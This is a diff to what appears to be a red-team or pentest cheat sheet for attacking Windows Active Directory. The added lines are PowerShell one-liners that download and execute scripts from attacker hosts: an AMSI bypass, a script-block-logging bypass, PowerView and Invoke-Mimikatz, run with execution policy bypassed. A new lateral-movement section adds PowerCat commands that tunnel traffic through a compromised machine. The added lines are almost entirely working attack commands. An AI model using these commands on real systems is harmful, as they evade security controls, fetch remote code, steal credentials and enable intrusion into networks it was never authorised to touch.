@@ -35,11 +35,21 @@ With a InvisiShell terminal you're able to execute or import scripts.
 A lot of techniques to bypass execution policy can be found on internet.
 
 ```
+PS C:\Users\demiidk\Documents\> powershell -c "iex (iwr -UseBasicParsing http://attacker.1/amsibypass.txt);iex (iwr -UseBasicParsing http://attacker/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.1/PowerView.ps1); import-module .\PowerView.ps1; Get-Domain"
+```
+
+
+```
 PS C:\Users\demiidk\Documents\> Get-Content .\PowerView.ps1 | PowerShell.exe -noprofile -
 ```
 
 ```
 PS C:\Users\demiidk\Documents\> powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://localhost:8080/PowerView.ps1')"
+```
+
+```
+PS C:\Users\demiidk\Documents\> Powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1');"
+
 ```
 
 ```
@@ -195,3 +205,22 @@ Test if MSSQL is accessible:
 PS C:\Users\demiidk\Documents\> Get-SQLConnectionTest -Instance SQLSRV01\SQL -Verbose
 ```
 
+## Step 04 - Lateral Movement.
+
+### Tunneling with PowerCat
+
+Attacker -> Compromised -> Target
+
+```
+PowerShell on Compromsided:
+
+PS C:\Users\demiidk\Documents\> powercat -l -p 1306 -r tcp:Target:1306 -v 
+```
+
+Target -> Compromised -> Attacker
+
+```
+PowerShell on Compromsided:
+
+PS C:\Users\demiidk\Documents\> powercat -l -p 1306 -r tcp:Attacker:1306 -v 
+```
